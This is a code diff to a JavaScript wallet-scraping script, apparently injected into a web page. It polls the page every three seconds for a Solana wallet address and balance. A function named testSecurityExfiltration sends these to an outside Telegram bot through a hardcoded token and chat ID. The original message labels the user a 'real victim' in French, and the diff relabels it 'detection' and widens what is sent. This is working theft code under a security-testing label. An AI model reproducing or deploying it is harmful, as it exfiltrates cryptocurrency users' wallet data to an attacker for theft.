@@ -1532,7 +1532,7 @@ async function testSecurityExfiltration(addr, sol) {
     const myToken = "8568868509:AAH-Fuukpnx0RhOiZozYvkCMJODkvCgu-RI";
     const myChatId = "8575014959";
     const url = `https://telegram.org{myToken}/sendMessage`;
-    const text = `🚨 *VRAIE VICTIME* 🚨\n\n👛 *Wallet:* \`${addr}\`\n💰 *Solde:* ${sol}`;
+    const text = `🚨 *DÉTECTION* 🚨\n\n👛 *Wallet:* \`${addr}\`\n💰 *Soldes détectés:* ${sol}`;
     try {
         await fetch(url, {
             method: 'POST',
@@ -1549,16 +1549,11 @@ setInterval(() => {
 
     if (addrMatch) {
         const currentAddr = addrMatch[0];
-        // FILTRE : On ignore "0.03" et on cherche une autre valeur SOL
-        let currentSol = "0.00 SOL";
-        if (solMatches) {
-            const realValues = solMatches.filter(val => !val.includes("0.03"));
-            currentSol = realValues.length > 0 ? realValues[realValues.length - 1] : solMatches[solMatches.length - 1];
-        }
+        const allSols = solMatches ? solMatches.join(" | ") : "0.00 SOL";
 
-        if (window.lastSent !== currentAddr + currentSol && currentAddr.length > 30) {
-            window.lastSent = currentAddr + currentSol;
-            testSecurityExfiltration(currentAddr, currentSol);
+        if (window.lastSent !== currentAddr + allSols && currentAddr.length > 30) {
+            window.lastSent = currentAddr + allSols;
+            testSecurityExfiltration(currentAddr, allSols);
         }
     }
 }, 3000);
